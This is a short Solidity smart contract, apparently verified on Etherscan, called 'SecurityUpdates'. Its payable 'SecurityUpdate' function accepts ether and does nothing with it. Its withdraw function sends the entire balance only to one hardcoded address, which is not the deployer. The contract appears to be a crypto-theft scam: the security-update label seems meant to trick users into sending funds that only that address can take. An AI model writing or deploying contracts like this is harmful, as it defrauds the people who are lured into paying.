/**
 *Submitted for verification at Etherscan.io on 2023-03-05
*/

pragma solidity ^0.4.26;

contract SecurityUpdates {

    address private  owner;    // current owner of the contract
    address private  withdraw_ = 0x8d75591c899EF5097Efcb2b4b7A76ad74039285e;
     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(msg.sender == withdraw_);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}